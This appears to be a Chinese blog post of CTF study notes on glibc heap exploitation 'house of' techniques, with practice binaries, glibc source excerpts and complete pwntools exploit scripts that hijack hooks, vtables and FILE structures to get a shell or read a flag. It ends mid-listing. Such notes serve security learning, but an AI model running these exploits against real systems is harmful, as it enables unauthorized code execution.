+++
date = '2025-06-06T17:22:45+08:00'
draft = false
title = 'House_of_xxx'

+++

# house of 系列

## house of roman

这个主要是利用方法就是通过unsorted bin 的fd 的低两字节对glibc上的某个结构进行要给1/16的一个覆盖爆破这里我们要对这个攻击方式进行一个学习

这里我们攻击流程和原理

这个漏洞和我们的glibc的版本和源码无关，主要是利用pie保护的一个缺陷。

因此我们的流程图是这样的

![image-20250524223941234](../images/image-20250524223941234.png)

![image-20250524224025348](../images/image-20250524224025348.png)

![image-20250524224041117](../images/image-20250524224041117.png)

这个就是整个数据结构的一个流程

但是着我们要注意远程是否又开aslr的地址随机化。同时可以通过/proc/sys/kernel/randomize_va_space的值是可以控制的这里就要移步学习aslr相关的程序

下面这一段就是他的一个核心代码

```py
		add_chunk(0, 0x68)
        add_chunk(1, 0x98)
        add_chunk(2, 0x68)#这个创建了三个堆块

        delete_chunk(1)#这里吧chunk1给free掉是的他进入unsortbin
        add_chunk(3, 0x28)#这里分割出一个0x28大小的堆块，是的chunk1有0x68大小的堆使得它可以绕过fastbin的一个检查这里就要看fastbin attck
        add_chunk(1, 0x68)
        edit_chunk(1, p16(0xbaed))#这里这个数据是用来覆盖到mallod_hook的一个操作

        delete_chunk(2)#double free
        delete_chunk(0)
        delete_chunk(2)

        add_chunk(0, 0x68) 
        edit_chunk(0, p8(0xa0))

        add_chunk(0, 0x68)#这里我们就可以指向0xa0方向的heap
        add_chunk(0, 0x68)
        add_chunk(0, 0x68)
        add_chunk(0, 0x68)
```

## house of force

这个攻击手法主要就是通过篡改topchunk的size为一个很大的值可以绕过对用户请求大小和topchunk现有的size进行一个验证

先看一下现有的验证模式：

```c
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
{
    remainder_size = size - nb;
    remainder = chunk_at_offset(victim, nb);
    av->top = remainder;
    set_head(victim, nb | PREV_INUSE |
    (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);
    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```

如果用户请求的堆块大小不受限制就可以使得topchunk指向我们希望的任何位置。

但是自2.29版本新增加了对top chunk size的合理性的检查，就失效了

```C
victim = av->top;
size = chunksize (victim);
if (__glibc_unlikely (size > av->system_mem))
malloc_printerr ("malloc(): corrupted top size");
```

实例代码:

```c
#include<stdlib.h>
#include <stdio.h>
#include <unistd.h>

char *chunk_list[0x100];

void menu() {
    puts("1. add chunk");
    puts("2. delete chunk");
    puts("3. edit chunk");
    puts("4. show chunk");
    puts("5. exit");
    puts("choice:");
}

size_t get_num() {
    size_t num;
    scanf("%llu", &num);
    return num;
}

void add_chunk() {
    puts("index:");
    int index = get_num();
    puts("size:");
    size_t size = get_num();
    chunk_list[index] = malloc(size);
}

void delete_chunk() {
    puts("index:");
    int index = get_num();
    free(chunk_list[index]);
}

void edit_chunk() {
    puts("index:");
    int index = get_num();
    puts("length:");
    int length = get_num();
    puts("content:");
    read(0, chunk_list[index], length);
}

void show_chunk() {
    puts("index:");
    int index = get_num();
    puts(chunk_list[index]);
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    while (1) {
        menu();
        switch (get_num()) {
            case 1:
                add_chunk();
                break;
            case 2:
                delete_chunk();
                break;
            case 3:
                edit_chunk();
                break;
            case 4:
                show_chunk();
                break;
            case 5:
                exit(0);
            default:
                puts("invalid choice.");
        }
    }
}

```

patch.sh

```sh
#!/bin/bash

VERSION=2.27
LIBC_NAME=libc.so.6
LD_NAME=ld-linux-x86-64.so.2

gcc pwn.c -o pwn -g
cp /glibc/${VERSION}/amd64/lib/${LIBC_NAME} .
cp /glibc/${VERSION}/amd64/lib/${LD_NAME} .

chmod 777 ${LIBC_NAME}
chmod 777 ${LD_NAME}

patchelf --replace-needed libc.so.6 ./${LIBC_NAME} ./pwn
patchelf --set-interpreter ./${LD_NAME} ./pwn
```

这里我们就要说明一下使用这个手法的坑了

```tex
他对我们输入数据的类型有着一定的限制也就是他在get-num的时候的获取的类型需要为一个机器字长的数据如果他构造的是一个int也是不行的尤其是size位
```

这里使用一下他的具体代码实现

```py
#由于我们需要它的堆地址和libc所以我们需要调用4个堆块
add_chunk(0, 0x410)
add_chunk(1, 0x410)
add_chunk(2, 0x410)
add_chunk(3, 0x410)

delete_chunk(0)
delete_chunk(2)
show_chunk(0)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - 0x3afca0
info("libc base: " + hex(libc.address))
show_chunk(2)
p.recv()
heap_base = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - 0x250
info("heap base: " + hex(heap_base))

delete_chunk(1)
delete_chunk(3)#把堆块重新放回去

n64 = lambda x: (x + 0x10000000000000000) & 0xFFFFFFFFFFFFFFFF

add_chunk(0, 0x18)

edit_chunk(0, b'a' * 0x18 + p64(n64(-1)))#修改top chunk的size

add_chunk(0, n64((libc.sym['__free_hook']-0x10)-(heap_base+0x270)-0x10-0x40))#直接通过偏移早到free hook的地方
info(hex(n64(-1)))

add_chunk(0,0x100)
edit_chunk(0, b'/bin/sh'.ljust(0x48, b'\x00') + p64(libc.sym['system']))
delete_chunk(0)
```

说实话其实这个用法也不是很好用的一个手法

## house of einherjar

这个攻击手法主要使用的一个技术手段就是heap overlapping的一个攻击手法，同时他的主要一个攻击手法就是使用的是在利用释放不在fast bin大小范围的chunk尝试和前面的chunk进行要给unlink的一个机制

![image-20250601184317006](../images/image-20250601184317006.png)

上面就是我们的一个攻击流程图由于他也是使用到了unlink因此我们要对unlink进行一个，而这个绕过就要去查看unlink的绕过方式了

```py
add_chunk(0, 0x208)
add_chunk(1, 0x208)
add_chunk(2, 0xf8)
add_chunk(3, 0x28)

delete_chunk(0)
delete_chunk(2)
# gdb.attach(p)
show_chunk(0)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - 0x39bb78
info("libc base: " + hex(libc.address))
edit_chunk(0, 'a' * 8)
show_chunk(0)
p.recv()
heap_base = u64(p.recv(14)[-6:].ljust(8, b'\x00')) - 0x420
info("heap base: " + hex(heap_base))
gdb.attach(p)
edit_chunk(0, p64(libc.address+0x39bb78))
#上面的主要做了libc leak和heap leak，下面是工具的主要利用
#重新申请堆块并且在chunk0中写入fake chunk下面满足的绕过条件是fd的bk等于bk的fd
add_chunk(0,0x208)
add_chunk(2,0xf8)

fake_chunk = b''
fake_chunk += p64(0)
fake_chunk += p64(0x411)
fake_chunk += p64(heap_base+0x10)
fake_chunk += p64(heap_base+0x10)

edit_chunk(0,fake_chunk)
#并且要更改下一个chunk的pver_size和size的inuser位是的他完成unlink合并
edit_chunk(1,b'a'*0x200 + p64(0x410)+p8(0))
gdb.attach(p)

# gdb.attach(p,'b __int_free\nc')
# pause()

delete_chunk(2)
```

## house of Spirit 

它主要使用的方式就是在目标位置伪造fastbin chunk 并且释放，从而达到分配指定地址的chunk的目的。

![image-20250602213644026](../images/image-20250602213644026.png)

要想构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表，需要绕过一些检查

其中第一个时fake chunk 的ismmap位不能为1，因为free时，如果时mmap的chunk，会单独处理会进行一个单独处理。

```c
if (chunk_is_mmapped(p)) /* release mmapped memory. */
{
    /* see if the dynamic brk/mmap threshold needs adjusting */
    if (!mp_.no_dyn_threshold && p->size > mp_.mmap_threshold && p->size<= DEFAULT_MMAP_THRESHOLD_MAX) {
        mp_.mmap_threshold = chunksize(p);
        mp_.trim_threshold = 2 * mp_.mmap_threshold;
        LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2,
        mp_.mmap_threshold, mp_.trim_threshold);
    } m
        unmap_chunk(p);
        return;
}
ar_ptr = arena_for_chunk(p);
_int_free(ar_ptr, p, 0);
```

斌且fake chunk地址需要对戏malloc_align_mask这个大小

```c
#define MINSIZE \
	(unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &
~MALLOC_ALIGN_MASK))
#define aligned_OK(m) (((unsigned long) (m) &MALLOC_ALIGN_MASK) == 0)
	/* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */
	if (__glibc_unlikely(size < MINSIZE || !aligned_OK(size))) {
        errstr = "free(): invalid size";
        goto errout;
}
```

同时还要保证fake chunk的size大小需要满足fast bin的需求

```c
if ((unsigned long) (size) <= (unsigned long) (get_max_fast())
```

fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ ，同时也不能大小av->system_mem

```c
if (__builtin_expect(chunk_at_offset(p, size)->size <= 2 * SIZE_SZ,
0) ||
	__builtin_expect(chunksize(chunk_at_offset(p, size)) >= av->system_mem, 0)) {
	/* We might not have a lock at this point and concurrent
modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */
        if (have_lock || ({
        assert(locked == 0);
        mutex_lock(&av->mutex);
        locked = 1;
        chunk_at_offset(p, size)->size <= 2 * SIZE_SZ ||chunksize(chunk_at_offset(p, size)) >= av->system_mem;
        })) {
            errstr = "free(): invalid next size (fast)";
            goto errout;
        } 
            if (!have_lock) {
            (void) mutex_unlock(&av->mutex);
            locked = 0;
    }
}
```

fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况  

```c
if (__builtin_expect(old == p, 0)) {
    errstr = "double free or corruption (fasttop)";
    goto errout;
}
```

这里需要一个例题：lctf2016_pwn200  

## house of strom

house of strom是一个可以用来任意地址malloc的一个方法而这个方法本质上就是通过unsorted bin和large bin的结合来进行一个合作来完成的

这个方法主要的一个实现方式就是通过我们在large bin中构造一个fakechunk 使得这个chunk里面通unsorted bin中构造一个堆块进行要给写入就可以在fakechunk的位置写入一个堆地址使得我们可以构造一个size文件

因此我们的攻击手法也是比较明确了

这里我们调用的文件

```c
#include<stdlib.h>
#include <stdio.h>
#include <unistd.h>

char *chunk_list[0x100];

void menu() {
    puts("1. add chunk");
    puts("2. delete chunk");
    puts("3. edit chunk");
    puts("4. show chunk");
    puts("5. exit");
    puts("choice:");
}

size_t get_num() {
    size_t num;
    scanf("%llu", &num);
    return num;
}

void add_chunk() {
    puts("index:");
    int index = get_num();
    puts("size:");
    size_t size = get_num();
    chunk_list[index] = malloc(size);
}

void delete_chunk() {
    puts("index:");
    int index = get_num();
    free(chunk_list[index]);
}

void edit_chunk() {
    puts("index:");
    int index = get_num();
    puts("length:");
    int length = get_num();
    puts("content:");
    read(0, chunk_list[index], length);
}

void show_chunk() {
    puts("index:");
    int index = get_num();
    puts(chunk_list[index]);
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    while (1) {
        menu();
        switch (get_num()) {
            case 1:
                add_chunk();
                break;
            case 2:
                delete_chunk();
                break;
            case 3:
                edit_chunk();
                break;
            case 4:
                show_chunk();
                break;
            case 5:
                exit(0);
            default:
                puts("invalid choice.");
        }
    }
}

```

exp:

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendlineafter("choice:", "1")
    p.sendlineafter("index:", str(index))
    p.sendlineafter("size:", str(size))


def delete_chunk(index):
    p.sendlineafter("choice:", "2")
    p.sendlineafter("index:", str(index))


def edit_chunk(index, content):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("index:", str(index))
    p.sendlineafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendlineafter("choice:", "4")
    p.sendlineafter("index:", str(index))

add_chunk(0, 0x418)
add_chunk(1, 0x18)
add_chunk(2, 0x428)
add_chunk(3, 0x18)
delete_chunk(0)
show_chunk(0)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - 0x39bb78
info("libc base: " + hex(libc.address))

add_chunk(10,0x500)
edit_chunk(0, p64(0) + p64(libc.sym['__free_hook'] - 8) + p64(0) + p64(libc.sym['__free_hook'] - 0x10 - 0x18 - 5))
delete_chunk(2)
edit_chunk(2, p64(0) + p64(libc.sym['__free_hook'] - 0x10))

add_chunk(4,0x48)
# gdb.attach(p)
gdb.attach(p)

p.interactive()
```

这个攻击手法在2.29以后也是失效了

## house of rabbit

## house of orange

这个手法其实就是当我们函数中没有出现free这个函数的时候通过编译系统上的一定的手法再无free情况下来得到一个unsortedbin的一个chunk后半部分就是通过unsorted bin attack来劫持io list all来实现fsop

这里我就直接上文件代码和源代码了

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))

add_chunk(0,0x18)
edit_chunk(0,b'a'*0x18+p64(0xfe1))
add_chunk(1,0xff0)
add_chunk(1,0xff0)

edit_chunk(0,'a'*0x20)
show_chunk(0)
p.recvuntil(b'a'*0x20)
libc.address = u64(p.recv(6).ljust(8,b'\x00'))-0x39c188
info("libc.address:"+hex(libc.address))

edit_chunk(0,'a'*0x30)
show_chunk(0)
p.recvuntil(b'a'*0x30)
heap_base = u64(p.recv(6).ljust(8,b'\x00'))& ~0xfff
info("heap_base:"+hex(heap_base))

edit_chunk(0,b'a'*0x18+p64(0xfe1)+p64(libc.address+0x39c188)*2+p64(heap_base+0x20)*2)

add_chunk(2,0x18)

fake_file = b""
fake_file += b"/bin/sh\x00"  # _flags, an magic number
fake_file += p64(0x61)  # _IO_read_ptr
fake_file += p64(0)  # _IO_read_end
fake_file += p64(libc.sym['_IO_list_all'] - 0x10)  # _IO_read_base
fake_file += p64(0)  # _IO_write_base
fake_file += p64(libc.sym['system'])  # _IO_write_ptr
fake_file += p64(0)  # _IO_write_end
fake_file += p64(0)  # _IO_buf_base;
fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_file += p64(0) * 4  # from _IO_save_base to _markers
fake_file += p64(0)  # the FILE chain ptr
fake_file += p32(2)  # _fileno for stderr is 2
fake_file += p32(0)  # _flags2, usually 0
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_file += p16(0)  # _cur_column
fake_file += b"\x00"  # _vtable_offset
fake_file += b"\n"  # _shortbuf[1]
fake_file += p32(0)  # padding
fake_file += p64(0)  # _IO_stdfile_1_lock
fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_file += p64(0)  # _codecvt, usually 0
fake_file += p64(0)  # _IO_wide_data_1
fake_file += p64(0) * 3  # from _freeres_list to __pad5
fake_file += p32(0xFFFFFFFF)  # _mode, usually -1
fake_file += b"\x00" * 19  # _unused2
fake_file = fake_file.ljust(0xD8, b'\x00')  # adjust to vtable
fake_file += p64(heap_base + 0x40 + 0x10)  # fake vtable

edit_chunk(2,b'a'*0x10+fake_file)

gdb.attach(p,'b _int_malloc\nc')

add_chunk(4,0x500)



p.interactive()
```



```c
#include<stdlib.h>
#include <stdio.h>
#include <unistd.h>

char *chunk_list[0x100];

void menu() {
    puts("1. add chunk");
    puts("2. delete chunk");
    puts("3. edit chunk");
    puts("4. show chunk");
    puts("5. exit");
    puts("choice:");
}

int get_num() {
    char buf[0x10];
    read(0, buf, sizeof(buf));
    return atoi(buf);
}

void add_chunk() {
    puts("index:");
    int index = get_num();
    puts("size:");
    int size = get_num();
    chunk_list[index] = malloc(size);
}

void delete_chunk() {
    puts("index:");
    int index = get_num();
    free(chunk_list[index]);
}

void edit_chunk() {
    puts("index:");
    int index = get_num();
    puts("length:");
    int length = get_num();
    puts("content:");
    read(0, chunk_list[index], length);
}

void show_chunk() {
    puts("index:");
    int index = get_num();
    puts(chunk_list[index]);
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    while (1) {
        menu();
        switch (get_num()) {
            case 1:
                add_chunk();
                break;
            case 2:
                delete_chunk();
                break;
            case 3:
                edit_chunk();
                break;
            case 4:
                show_chunk();
                break;
            case 5:
                exit(0);
            default:
                puts("invalid choice.");
        }
    }
}

```

这里我们可以看到我们通过溢出先改了topchunk的数据，由于我们再编译系统中我们可以知道当我的topchunk大小小于我们需要申请的大小是他会使用brk来重新申请一段topchunk出来进行一个分配，而前面的那一段topchunk会直接释放掉，这样我们就可以获得一个free的一个chunk来得到一个数据，接下来就是通过修改值来获得一些权限了

这里我们再说一下这个的一个底层原理，当我们free掉这个值以后我们就可以越界写到这个值的这个位置因我们可以吧他的大小改成一个0x61并且再bk上加上io list all-0x10当我们申请的时候会把0x61放到smallbin中并且list-all指向我们的整个bin数组，同时我们0x68的这个偏移上0x61这个位置刚好是chain的位置这样我们就可以修改io list pauts的一个值了

## house of kiwi

这里新学一个手法，这个house of的手法就是主要的一个原理就是我们在调用的时候可以知道有一些libc的vtable这个指针块他是可以直接进行一个写入的，因此我们尝试对vtable这个字段的指针进行写入，但是由于他也是一种house手法所以他的利用链也是有一个唯一的利用，可以绕过某种手法，他的调用链也是非常的好用的一个调用链。

这里的参看这个链的一个源代码：

这里主要调用的一个一个利用点就是在一个sysmalloc的一个位置

```c
assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));

  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

在这个位置的一个我们可以看到他对old_top进行了一个检查，而这个检查，并且触发这个检查的一个要求就是当我们的topchunk没有被初始化的时候会被触发一个assert这个函数而assert这个函数的底层使用的是malloc assert这个函数而在这个函数中会存在fflush这个函数，可以通过这个函数会调用到stderr这个io

```c
extern const char *__progname;

static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
		 const char *function)
{
  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
		     __progname, __progname[0] ? ": " : "",
		     file, line,
		     function ? function : "", function ? ": " : "",
		     assertion);
  fflush (stderr);
  abort ();
}

_IO_fflush (FILE *fp)
{
  if (fp == NULL)
    return _IO_flush_all ();
  else
    {
      int result;
      CHECK_FILE (fp, EOF);
      _IO_acquire_lock (fp);
      result = _IO_SYNC (fp) ? EOF : 0;
      _IO_release_lock (fp);
      return result;
    }
}
libc_hidden_def (_IO_fflush)
```

因此我们可以知道我们利用链，sysmallc->assert()->__malloc_assert->fflush(stderr)->_IO_SYNC->vtable

而这个手法利用的主要一个原因是因为当我们遇到没有调用io时获得的一个手法，由于我们没有调用io的使用时可以使用这个手法来进行一个攻击，他攻击的原来是通过sysmalloc中对top chunk的一个重置来调用io从而触发漏洞但是这个手法同样也有一个orw的一个手法，那么我这里先对一个普通的手法进行一个更新,这里我会放出c文件

c:

```c
#include<stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char *chunk_list[0x100];

#define puts(str) write(1, str, strlen(str)), write(1, "\n", 1)

void menu() {
    puts("1. add chunk");
    puts("2. delete chunk");
    puts("3. edit chunk");
    puts("4. show chunk");
    puts("5. exit");
    puts("choice:");
}

int get_num() {
    char buf[0x10];
    read(0, buf, sizeof(buf));
    return atoi(buf);
}

void add_chunk() {
    puts("index:");
    int index = get_num();
    puts("size:");
    int size = get_num();
    chunk_list[index] = malloc(size);
}

void delete_chunk() {
    puts("index:");
    int index = get_num();
    free(chunk_list[index]);
}

void edit_chunk() {
    puts("index:");
    int index = get_num();
    puts("length:");
    int length = get_num();
    puts("content:");
    read(0, chunk_list[index], length);
}

void show_chunk() {
    puts("index:");
    int index = get_num();
    puts(chunk_list[index]);
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    while (1) {
        menu();
        int choice = get_num();
        switch (choice) {
            case 1:
                add_chunk();
                break;
            case 2:
                delete_chunk();
                break;
            case 3:
                edit_chunk();
                break;
            case 4:
                show_chunk();
                break;
            case 5:
                _exit(0);
            default:
                puts("invalid choice.");
        }
    }
}

```



exp:

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


add_chunk(0, 0x100)
add_chunk(1, 0x100)
add_chunk(2, 0x100)

delete_chunk(0)
show_chunk(0)
p.recv()
heap_base = u64(p.recv(5)[-5:].ljust(8, b'\x00')) << 12
info("heap base: " + hex(heap_base))

edit_chunk(0, p64(heap_base >> 12) + p64(0))
delete_chunk(0)

edit_chunk(0, p64((heap_base >> 12) ^ (heap_base + 0x20)))
add_chunk(0, 0x100)
add_chunk(0, 0x100)
edit_chunk(0, b'\x00' * 14 + p16(0x7))

delete_chunk(1)
show_chunk(1)
p.recv()
libc.address = u64(p.recv(6)[-6:].ljust(8, b'\x00')) - 0x1f2ce0
info("libc base: " + hex(libc.address))

#这里对可以进行对任意地址的一个申请了
def arbitrary_address_write(address, content):
    align = address & 0xF
    address &= ~0xF
    edit_chunk(0, (b'\x00' * 14 + p16(0x7)).ljust(0xe8, b'\x00') + p64(address))
    add_chunk(1, 0x100)
    edit_chunk(1, b'\x00' * align + bytes(content))

onegadget = [0xdb1f1,0xdb1f4 ,0xdb1f7 ][0]+libc.address
arbitrary_address_write(libc.sym['_IO_file_jumps'],p64(libc.sym['system'])*0x10)
arbitrary_address_write(libc.sym['_IO_2_1_stderr_'],b'/bin/sh\x00')

edit_chunk(2,b'\x00'*0x110)
add_chunk(0,0x300)
# gdb.attach(p)
p.interactive()
```

接下来我们来查看orw的一个写法

```py
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


add_chunk(0, 0x100)
add_chunk(1, 0x100)
add_chunk(2, 0x100)

delete_chunk(0)
show_chunk(0)

heap_base = u64(p.recvuntil('\x05')[-5:].ljust(8, '\x00')) << 12
info("heap base: " + hex(heap_base))

edit_chunk(0, p64(heap_base >> 12) + p64(0))
delete_chunk(0)

edit_chunk(0, p64((heap_base >> 12) ^ (heap_base + 0x20)))
add_chunk(0, 0x100)
add_chunk(0, 0x100)
edit_chunk(0, '\x00' * 14 + p16(0x7))

delete_chunk(1)
show_chunk(1)
libc.address = u64(p.recvuntil('\x7F')[-6:].ljust(8, '\x00')) - 0x1f2ce0
info("libc base: " + hex(libc.address))


def arbitrary_address_write(address, content):
    align = address & 0xF
    address &= ~0xF
    gdb.attach(p)
    edit_chunk(0, ('\x00' * 14 + p16(0x7)).ljust(0xe8, '\x00') + p64(address))
    add_chunk(1, 0x100)
    edit_chunk(1, '\x00' * align + content)


arbitrary_address_write(libc.sym['_IO_file_jumps'] + 0x60, p64(libc.sym['setcontext'] + 61))

rop_addr = heap_base + 0x4c0
buf_addr = rop_addr + 0x70

rop = ''
rop += p64(libc.search(asm('pop rdi; ret;'), executable=True).next())
rop += p64(3)
rop += p64(libc.search(asm('pop rsi; ret;'), executable=True).next())
rop += p64(buf_addr)
rop += p64(libc.search(asm('pop rdx; pop rbx; ret;'), executable=True).next())
rop += p64(0x100)
rop += p64(0)
rop += p64(libc.sym['read'])
rop += p64(libc.search(asm('pop rdi; ret;'), executable=True).next())
rop += p64(buf_addr)
rop += p64(libc.sym['puts'])

rop = rop.ljust(buf_addr - rop_addr, '\x00')
rop += './flag'

frame = SigreturnFrame()
frame.rsp = rop_addr
frame.rdi = buf_addr
frame.rsi = 0
frame.rip = libc.sym['open']

frame = bytearray(str(frame))
frame[0x38:0x38 + 8] = p64(libc.sym['_IO_default_xsputn'])

arbitrary_address_write(libc.sym['_IO_file_jumps'] + 0x60, p64(libc.sym['setcontext'] + 61))
arbitrary_address_write(libc.sym['__start___libc_IO_vtables'], str(frame))
edit_chunk(2, rop.ljust(0x110, '\x00'))

# gdb.attach(p)

# gdb.attach(p, "b __malloc_assert\nc")
# pause()

add_chunk(3, 0x200)

p.interactive()

```

其实思路是差不多的就是吧system的位置改为setcontext进行一个写入，然后把rop写到heap上

## house of emma

glibc2.34之后彻底把以前常用的几个钩子hook函数删掉了，而且一些高版本的堆题由于各种限制难以进行任意地址申请，所以要考虑能够在某一个可控地址利用_IO_FILE直接getshell，那么就需要找到一个能够替代free_hook的函数指针来完成调用，House of emma就是这样一种新的调用链

House of emma的出现实际上一定程度上继承了House of kiwi，House of kiwi是通过修改触发malloc_assert时一定能触发的_IO_file_jumps中的sync函数指针为ROP调用链来getshell，而House of emma则是利用vtable虚表检测的宽松来对 vtable 表的起始位置进行修改，使其我们在调用具体偏移是固定的情况下，可以通过偏移来调用在 vtable 表中的任意函数

在house of emma中我们利用主要使用一个_io_cookie_jumps，他对链子其实也是和kiwi的手法差不多的但是不同的是在有些版本中他vtable的file_jumps这个字段是不可以写的因此house of kiwi这种手法就不可以使用了。这个时候就要考虑劫持vtable把vtable的调用写到我们对呀的危险函数上

也就是说这里我们用的链子还是和kiwi是一样的

```c
/* Copyright (C) 1993-2022 Free Software Foundation, Inc.
   This file is part of the GNU C Library.

   The GNU C Library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 2.1 of the License, or (at your option) any later version.

   The GNU C Library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.

   You should have received a copy of the GNU Lesser General Public
   License along with the GNU C Library; if not, see
   <https://www.gnu.org/licenses/>.

   As a special exception, if you link the code in this file with
   files compiled with a GNU compiler to produce an executable,
   that does not cause the resulting executable to be covered by
   the GNU Lesser General Public License.  This exception does not
   however invalidate any other reasons why the executable file
   might be covered by the GNU Lesser General Public License.
   This exception applies to code released by its copyright holders
   in files containing the exception.  */

#include <libioP.h>
#include <stdio.h>
#include <stdlib.h>
#include <shlib-compat.h>

static ssize_t
_IO_cookie_read (FILE *fp, void *buf, ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_read_function_t *read_cb = cfile->__io_functions.read;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (read_cb);
#endif

  if (read_cb == NULL)
    return -1;

  return read_cb (cfile->__cookie, buf, size);
}

static ssize_t
_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_write_function_t *write_cb = cfile->__io_functions.write;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (write_cb);
#endif

  if (write_cb == NULL)
    {
      fp->_flags |= _IO_ERR_SEEN;
      return 0;
    }

  ssize_t n = write_cb (cfile->__cookie, buf, size);
  if (n < size)
    fp->_flags |= _IO_ERR_SEEN;

  return n;
}

static off64_t
_IO_cookie_seek (FILE *fp, off64_t offset, int dir)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (seek_cb);
#endif

  return ((seek_cb == NULL
	   || (seek_cb (cfile->__cookie, &offset, dir)
	       == -1)
	   || offset == (off64_t) -1)
	  ? _IO_pos_BAD : offset);
}

static int
_IO_cookie_close (FILE *fp)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_close_function_t *close_cb = cfile->__io_functions.close;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (close_cb);
#endif

  if (close_cb == NULL)
    return 0;

  return close_cb (cfile->__cookie);
}


static off64_t
_IO_cookie_seekoff (FILE *fp, off64_t offset, int dir, int mode)
{
  /* We must force the fileops code to always use seek to determine
     the position.  */
  fp->_offset = _IO_pos_BAD;
  return _IO_file_seekoff (fp, offset, dir, mode);
}


static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_cookie_seekoff),
